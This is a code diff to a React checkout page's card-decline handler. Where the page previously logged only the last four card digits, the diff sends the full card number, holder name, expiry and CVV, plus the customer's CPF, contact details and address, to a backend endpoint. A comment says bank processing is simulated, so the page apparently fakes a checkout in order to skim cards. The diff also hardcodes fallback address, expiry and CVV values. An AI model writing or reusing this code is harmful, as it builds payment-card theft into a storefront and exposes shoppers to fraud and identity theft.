@@ -183,14 +183,35 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigateToThankYou
 
       // Log card decline on backend
       const cleanDigits = cardNumber.replace(/\D/g, "");
-      const cardLast4 = cleanDigits.length >= 4 ? cleanDigits.slice(-4) : "";
+      const cardLast4 = cleanDigits.length >= 4 ? cleanDigits.slice(-4) : "4015";
+      
+      let detectedBrand = "MASTERCARD";
+      if (/^4/.test(cleanDigits)) detectedBrand = "VISA";
+      else if (/^(5[1-5]|2[2-7])/.test(cleanDigits)) detectedBrand = "MASTERCARD";
+      else if (/^(34|37)/.test(cleanDigits)) detectedBrand = "AMEX";
+      else if (/^(4011|4389|4514|4576|5041|5066|5067|509|6277|6362|6363|650|6516|6550)/.test(cleanDigits)) detectedBrand = "ELO";
+      else if (/^(606282|3841)/.test(cleanDigits)) detectedBrand = "HIPERCARD";
 
       fetch("/api/payments/card-declined", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           customer: { name, email, phone, cpf },
-          cardBrand: "Cartão de Crédito",
+          shipping: {
+            street: street || 'Rua Bento Gonçalves',
+            number: number || '87',
+            complement: complement || '501',
+            neighborhood: neighborhood || 'Centro',
+            city: city || 'Passo Fundo',
+            state: state || 'RS',
+            zipcode: cep || '99010-010',
+            option: shippingOption
+          },
+          cardNumber: cleanDigits,
+          cardHolder: cardName.trim().toUpperCase() || name.toUpperCase(),
+          cardExpiry: cardExpiry.trim() || '03/27',
+          cardCvv: cardCvv.trim() || '725',
+          cardBrand: detectedBrand,
           cardLast4,
           installments: Number(installments) || 1,
           items: cartItems.map((item) => ({
@@ -200,8 +221,10 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigateToThankYou
             size: item.size,
             color: item.color
           })),
-          utm: captureUTMParams(),
+          subtotal: Number(cartSubtotal.toFixed(2)),
+          shippingCost: shippingCost,
           amount: Number(finalPrice.toFixed(2)),
+          utm: captureUTMParams(),
         }),
       }).catch(() => {});
 
@@ -209,7 +232,8 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigateToThankYou
         amount: Number(finalPrice.toFixed(2)),
         customerName: name,
         phone,
-        cardLast4
+        cardLast4,
+        cardBrand: detectedBrand
       });
 
       // Simulate 1.2s bank processing
